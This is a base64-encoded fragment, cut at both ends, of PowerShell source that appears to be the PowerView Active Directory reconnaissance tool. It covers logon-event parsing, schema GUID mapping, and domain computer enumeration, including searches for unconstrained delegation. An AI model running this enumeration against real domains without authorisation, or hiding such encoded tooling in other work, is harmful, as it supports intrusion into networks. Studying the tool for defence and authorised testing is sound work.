lc1s5XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEF1dGhlbnRpY2F0aW9uUGFja2FnZU5hbWUgPSAkUHJvcGVydGllc1sxMF0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXb3Jrc3RhdGlvbk5hbWUgICAgICAgICAgID0gJFByb3BlcnRpZXNbMTFdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTG9nb25HdWlkICAgICAgICAgICAgICAgICA9ICRQcm9wZXJ0aWVzWzEyXS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYW5zbWl0dGVkU2VydmljZXMgICAgICAgPSAkUHJvcGVydGllc1sxM10uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMbVBhY2thZ2VOYW1lICAgICAgICAgICAgID0gJFByb3BlcnRpZXNbMTRdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgS2V5TGVuZ3RoICAgICAgICAgICAgICAgICA9ICRQcm9wZXJ0aWVzWzE1XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByb2Nlc3NJZCAgICAgICAgICAgICAgICAgPSAkUHJvcGVydGllc1sxNl0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQcm9jZXNzTmFtZSAgICAgICAgICAgICAgID0gJFByb3BlcnRpZXNbMTddLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSXBBZGRyZXNzICAgICAgICAgICAgICAgICA9ICRQcm9wZXJ0aWVzWzE4XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIElwUG9ydCAgICAgICAgICAgICAgICAgICAgPSAkUHJvcGVydGllc1sxOV0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJbXBlcnNvbmF0aW9uTGV2ZWwgICAgICAgID0gJFByb3BlcnRpZXNbMjBdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzdHJpY3RlZEFkbWluTW9kZSAgICAgICA9ICRQcm9wZXJ0aWVzWzIxXS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldE91dGJvdW5kVXNlck5hbWUgICAgPSAkUHJvcGVydGllc1syMl0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUYXJnZXRPdXRib3VuZERvbWFpbk5hbWUgID0gJFByb3BlcnRpZXNbMjNdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmlydHVhbEFjY291bnQgICAgICAgICAgICA9ICRQcm9wZXJ0aWVzWzI0XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldExpbmtlZExvZ29uSWQgICAgICAgPSAkUHJvcGVydGllc1syNV0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbGV2YXRlZFRva2VuICAgICAgICAgICAgID0gJFByb3BlcnRpZXNbMjZdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Mb2dvbkV2ZW50JykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgIyBsb2dvbiB3aXRoIGV4cGxpY2l0IGNyZWRlbnRpYWwKICAgICAgICAgICAgICAgICAgICA0NjQ4IHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBza2lwIGNvbXB1dGVyIGxvZ29ucywgZm9yIG5vdy4uLgogICAgICAgICAgICAgICAgICAgICAgICBpZigoLW5vdCAkUHJvcGVydGllc1s1XS5WYWx1ZS5FbmRzV2l0aCgnJCcpKSAtYW5kICgkUHJvcGVydGllc1sxMV0uVmFsdWUgLW1hdGNoICd0YXNraG9zdFwuZXhlJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgPSBOZXctT2JqZWN0IFBTT2JqZWN0IC1Qcm9wZXJ0eSBAewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbXB1dGVyTmFtZSAgICAgICAgICAgICAgPSAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUaW1lQ3JlYXRlZCAgICAgICA9ICRFdmVudC5UaW1lQ3JlYXRlZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEV2ZW50SWQgICAgICAgICAgID0gJEV2ZW50LklkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU3ViamVjdFVzZXJTaWQgICAgPSAkUHJvcGVydGllc1swXS5WYWx1ZS5Ub1N0cmluZygpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU3ViamVjdFVzZXJOYW1lICAgPSAkUHJvcGVydGllc1sxXS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFN1YmplY3REb21haW5OYW1lID0gJFByb3BlcnRpZXNbMl0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdWJqZWN0TG9nb25JZCAgICA9ICRQcm9wZXJ0aWVzWzNdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTG9nb25HdWlkICAgICAgICAgPSAkUHJvcGVydGllc1s0XS5WYWx1ZS5Ub1N0cmluZygpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGFyZ2V0VXNlck5hbWUgICAgPSAkUHJvcGVydGllc1s1XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldERvbWFpbk5hbWUgID0gJFByb3BlcnRpZXNbNl0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUYXJnZXRMb2dvbkd1aWQgICA9ICRQcm9wZXJ0aWVzWzddLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGFyZ2V0U2VydmVyTmFtZSAgPSAkUHJvcGVydGllc1s4XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldEluZm8gICAgICAgID0gJFByb3BlcnRpZXNbOV0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQcm9jZXNzSWQgICAgICAgICA9ICRQcm9wZXJ0aWVzWzEwXS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByb2Nlc3NOYW1lICAgICAgID0gJFByb3BlcnRpZXNbMTFdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSXBBZGRyZXNzICAgICAgICAgPSAkUHJvcGVydGllc1sxMl0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJcFBvcnQgICAgICAgICAgICA9ICRQcm9wZXJ0aWVzWzEzXS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuRXhwbGljaXRDcmVkZW50aWFsTG9nb25FdmVudCcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZGVmYXVsdCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIk5vIGhhbmRsZXIgZXhpc3RzIGZvciBldmVudCBJRDogJCgkRXZlbnQuSWQpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5HVUlETWFwIHsKPCMKLlNZTk9QU0lTCgpIZWxwZXIgdG8gYnVpbGQgYSBoYXNoIHRhYmxlIG9mIFtHVUlEXSAtPiByZXNvbHZlZCBuYW1lcyBmb3IgdGhlIGN1cnJlbnQgb3Igc3BlY2lmaWVkIERvbWFpbi4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpblNlYXJjaGVyLCBHZXQtRm9yZXN0ICAKCi5ERVNDUklQVElPTgoKU2VhcmNoZXMgdGhlIGZvcmVzdCBzY2hlbWEgbG9jYXRpb24gKENOPVNjaGVtYSxDTj1Db25maWd1cmF0aW9uLERDPXRlc3RsYWIsREM9bG9jYWwpIGZvcgphbGwgb2JqZWN0cyB3aXRoIHNjaGVtYUlER1VJRCBzZXQgYW5kIHRyYW5zbGF0ZXMgdGhlIEdVSURzIGRpc2NvdmVyZWQgdG8gaHVtYW4tcmVhZGFibGUgbmFtZXMuClRoZW4gc2VhcmNoZXMgdGhlIGV4dGVuZGVkIHJpZ2h0cyBsb2NhdGlvbiAoQ049RXh0ZW5kZWQtUmlnaHRzLENOPUNvbmZpZ3VyYXRpb24sREM9dGVzdGxhYixEQz1sb2NhbCkKZm9yIG9iamVjdHMgd2hlcmUgb2JqZWN0Q2xhc3M9Y29udHJvbEFjY2Vzc1JpZ2h0LCB0cmFuc2xhdGluZyB0aGUgR1VJRHMgYWdhaW4uCgpIZWF2aWx5IGFkYXB0ZWQgZnJvbSBodHRwOi8vYmxvZ3MudGVjaG5ldC5jb20vYi9hc2hsZXltY2dsb25lL2FyY2hpdmUvMjAxMy8wMy8yNS9hY3RpdmUtZGlyZWN0b3J5LW91LXBlcm1pc3Npb25zLXJlcG9ydC1mcmVlLXBvd2Vyc2hlbGwtc2NyaXB0LWRvd25sb2FkLmFzcHgKCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouT1VUUFVUUwoKSGFzaHRhYmxlCgpPdXB1dHMgYSBoYXNodGFibGUgY29udGFpbmluZyBhIEdVSUQgLT4gUmVhZGFibGUgTmFtZSBtYXBwaW5nLgoKLkxJTksKCmh0dHA6Ly9ibG9ncy50ZWNobmV0LmNvbS9iL2FzaGxleW1jZ2xvbmUvYXJjaGl2ZS8yMDEzLzAzLzI1L2FjdGl2ZS1kaXJlY3Rvcnktb3UtcGVybWlzc2lvbnMtcmVwb3J0LWZyZWUtcG93ZXJzaGVsbC1zY3JpcHQtZG93bmxvYWQuYXNweAojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZShbSGFzaHRhYmxlXSldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICAkR1VJRHMgPSBAeycwMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAnID0gJ0FsbCd9CgogICAgJEZvcmVzdEFyZ3VtZW50cyA9IEB7fQogICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRGb3Jlc3RBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICB0cnkgewogICAgICAgICRTY2hlbWFQYXRoID0gKEdldC1Gb3Jlc3QgQEZvcmVzdEFyZ3VtZW50cykuc2NoZW1hLm5hbWUKICAgIH0KICAgIGNhdGNoIHsKICAgICAgICB0aHJvdyAnW0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBpbiByZXRyaWV2aW5nIGZvcmVzdCBzY2hlbWEgcGF0aCBmcm9tIEdldC1Gb3Jlc3QnCiAgICB9CiAgICBpZiAoLW5vdCAkU2NoZW1hUGF0aCkgewogICAgICAgIHRocm93ICdbR2V0LURvbWFpbkdVSURNYXBdIEVycm9yIGluIHJldHJpZXZpbmcgZm9yZXN0IHNjaGVtYSBwYXRoIGZyb20gR2V0LUZvcmVzdCcKICAgIH0KCiAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICdTZWFyY2hCYXNlJyA9ICRTY2hlbWFQYXRoCiAgICAgICAgJ0xEQVBGaWx0ZXInID0gJyhzY2hlbWFJREdVSUQ9KiknCiAgICB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAkU2NoZW1hU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCgogICAgaWYgKCRTY2hlbWFTZWFyY2hlcikgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgICRSZXN1bHRzID0gJFNjaGVtYVNlYXJjaGVyLkZpbmRBbGwoKQogICAgICAgICAgICAkUmVzdWx0cyB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJEdVSURzWyhOZXctT2JqZWN0IEd1aWQgKCwkXy5wcm9wZXJ0aWVzLnNjaGVtYWlkZ3VpZFswXSkpLkd1aWRdID0gJF8ucHJvcGVydGllcy5uYW1lWzBdCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1VJRE1hcF0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFNjaGVtYVNlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgIH0KICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1VJRE1hcF0gRXJyb3IgaW4gYnVpbGRpbmcgR1VJRCBtYXA6ICRfIgogICAgICAgIH0KICAgIH0KCiAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTY2hlbWFQYXRoLnJlcGxhY2UoJ1NjaGVtYScsJ0V4dGVuZGVkLVJpZ2h0cycpCiAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICcob2JqZWN0Q2xhc3M9Y29udHJvbEFjY2Vzc1JpZ2h0KScKICAgICRSaWdodHNTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKCiAgICBpZiAoJFJpZ2h0c1NlYXJjaGVyKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJFJlc3VsdHMgPSAkUmlnaHRzU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkR1VJRHNbJF8ucHJvcGVydGllcy5yaWdodHNndWlkWzBdLnRvU3RyaW5nKCldID0gJF8ucHJvcGVydGllcy5uYW1lWzBdCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1VJRE1hcF0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFJpZ2h0c1NlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgIH0KICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1VJRE1hcF0gRXJyb3IgaW4gYnVpbGRpbmcgR1VJRCBtYXA6ICRfIgogICAgICAgIH0KICAgIH0KCiAgICAkR1VJRHMKfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5Db21wdXRlciB7CjwjCi5TWU5PUFNJUwoKUmV0dXJuIGFsbCBjb21wdXRlcnMgb3Igc3BlY2lmaWMgY29tcHV0ZXIgb2JqZWN0cyBpbiBBRC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpblNlYXJjaGVyLCBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAgCgouREVTQ1JJUFRJT04KCkJ1aWxkcyBhIGRpcmVjdG9yeSBzZWFyY2hlciBvYmplY3QgdXNpbmcgR2V0LURvbWFpblNlYXJjaGVyLCBidWlsZHMgYSBjdXN0b20KTERBUCBmaWx0ZXIgYmFzZWQgb24gdGFyZ2V0aW5nL2ZpbHRlciBwYXJhbWV0ZXJzLCBhbmQgc2VhcmNoZXMgZm9yIGFsbCBvYmplY3RzCm1hdGNoaW5nIHRoZSBjcml0ZXJpYS4gVG8gb25seSByZXR1cm4gc3BlY2lmaWMgcHJvcGVydGllcywgdXNlCiItUHJvcGVydGllcyBzYW1hY2NvdW50bmFtZSx1c25jaGFuZ2VkLC4uLiIuIEJ5IGRlZmF1bHQsIGFsbCBjb21wdXRlciBvYmplY3RzIGZvcgp0aGUgY3VycmVudCBkb21haW4gYXJlIHJldHVybmVkLgoKLlBBUkFNRVRFUiBJZGVudGl0eQoKQSBTYW1BY2NvdW50TmFtZSAoZS5nLiBXSU5ET1dTMTAkKSwgRGlzdGluZ3Vpc2hlZE5hbWUgKGUuZy4gQ049V0lORE9XUzEwLENOPUNvbXB1dGVycyxEQz10ZXN0bGFiLERDPWxvY2FsKSwKU0lEIChlLmcuIFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTEyNCksIEdVSUQgKGUuZy4gNGYxNmI2YmMtNzAxMC00Y2JmLWI2MjgtZjNjZmUyMGY2OTk0KSwKb3IgYSBkbnMgaG9zdCBuYW1lIChlLmcuIHdpbmRvd3MxMC50ZXN0bGFiLmxvY2FsKS4gV2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBVQUNGaWx0ZXIKCkR5bmFtaWMgcGFyYW1ldGVyIHRoYXQgYWNjZXB0cyBvbmUgb3IgbW9yZSB2YWx1ZXMgZnJvbSAkVUFDRW51bSwgaW5jbHVkaW5nCiJOT1RfWCIgbmVnYXRpb24gZm9ybXMuIFRvIHNlZSBhbGwgcG9zc2libGUgdmFsdWVzLCBydW4gJzB8Q29udmVydEZyb20tVUFDVmFsdWUgLVNob3dBbGwnLgoKLlBBUkFNRVRFUiBVbmNvbnN0cmFpbmVkCgpTd2l0Y2guIFJldHVybiBjb21wdXRlciBvYmplY3RzIHRoYXQgaGF2ZSB1bmNvbnN0cmFpbmVkIGRlbGVnYXRpb24uCgouUEFSQU1FVEVSIFRydXN0ZWRUb0F1dGgKClN3aXRjaC4gUmV0dXJuIGNvbXB1dGVyIG9iamVjdHMgdGhhdCBhcmUgdHJ1c3RlZCB0byBhdXRoZW50aWNhdGUgZm9yIG90aGVyIHByaW5jaXBhbHMuCgouUEFSQU1FVEVSIFByaW50ZXJzCgpTd2l0Y2guIFJldHVybiBvbmx5IHByaW50ZXJzLgoKLlBBUkFNRVRFUiBTUE4KClJldHVybiBjb21wdXRlcnMgd2l0aCBhIHNwZWNpZmljIHNlcnZpY2UgcHJpbmNpcGFsIG5hbWUsIHdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgT3BlcmF0aW5nU3lzdGVtCgpSZXR1cm4gY29tcHV0ZXJzIHdpdGggYSBzcGVjaWZpYyBvcGVyYXRpbmcgc3lzdGVtLCB3aWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIFNlcnZpY2VQYWNrCgpSZXR1cm4gY29tcHV0ZXJzIHdpdGggYSBzcGVjaWZpYyBzZXJ2aWNlIHBhY2ssIHdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgU2l0ZU5hbWUKClJldHVybiBjb21wdXRlcnMgaW4gdGhlIHNwZWNpZmljIEFEIFNpdGUgbmFtZSwgd2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBQaW5nCgpTd2l0Y2guIFBpbmcgZWFjaCBob3N0IHRvIGVuc3VyZSBpdCdzIHVwIGJlZm9yZSBlbnVtZXJhdGluZy4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFByb3BlcnRpZXMKClNwZWNpZmllcyB0aGUgcHJvcGVydGllcyBvZiB0aGUgb3V0cHV0IG9iamVjdCB0byByZXRyaWV2ZSBmcm9tIHRoZSBzZXJ2ZXIuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFNlY3VyaXR5TWFza3MKClNwZWNpZmllcyBhbiBvcHRpb24gZm9yIGV4YW1pbmluZyBzZWN1cml0eSBpbmZvcm1hdGlvbiBvZiBhIGRpcmVjdG9yeSBvYmplY3QuCk9uZSBvZiAnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgRmluZE9uZQoKT25seSByZXR1cm4gb25lIHJlc3VsdCBvYmplY3QuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouUEFSQU1FVEVSIFJhdwoKU3dpdGNoLiBSZXR1cm4gcmF3IHJlc3VsdHMgaW5zdGVhZCBvZiB0cmFuc2xhdGluZyB0aGUgZmllbGRzIGludG8gYSBjdXN0b20gUFNPYmplY3QuCgouRVhBTVBMRQoKR2V0LURvbWFpbkNvbXB1dGVyCgpSZXR1cm5zIHRoZSBjdXJyZW50IGNvbXB1dGVycyBpbiBjdXJyZW50IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluQ29tcHV0ZXIgLVNQTiBtc3NxbCogLURvbWFpbiB0ZXN0bGFiLmxvY2FsCgpSZXR1cm5zIGFsbCBNUyBTUUwgc2VydmVycyBpbiB0aGUgdGVzdGxhYi5sb2NhbCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpbkNvbXB1dGVyIC1VQUNGaWx0ZXIgVFJVU1RFRF9GT1JfREVMRUdBVElPTixTRVJWRVJfVFJVU1RfQUNDT1VOVCAtUHJvcGVydGllcyBkbnNob3N0bmFtZQoKUmV0dXJuIHRoZSBkbnMgaG9zdG5hbWVzIG9mIHNlcnZlcnMgdHJ1c3RlZCBmb3IgZGVsZWdhdGlvbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluQ29tcHV0ZXIgLVNlYXJjaEJhc2UgIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIgLVVuY29uc3RyYWluZWQKClNlYXJjaCB0aGUgc3BlY2lmaWVkIE9VIGZvciBjb21wdXRlcmVzIHRoYXQgYWxsb3cgdW5jb25zdHJhaW5lZCBkZWxlZ2F0aW9uLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdH